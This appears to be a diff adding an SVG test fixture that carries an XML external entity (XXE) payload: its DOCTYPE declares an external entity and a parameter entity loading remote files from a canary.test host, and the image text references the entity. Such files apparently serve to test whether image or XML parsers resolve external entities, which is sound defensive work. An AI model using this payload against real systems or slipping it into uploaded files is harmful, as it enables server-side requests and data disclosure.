@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+ <!ENTITY xxe SYSTEM "http://canary.test/h11-xxe">
+ <!ENTITY % pe SYSTEM "http://canary.test/h11-pe.dtd">
+ %pe;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="#3a3"/><text x="0" y="50">&xxe;</text></svg>
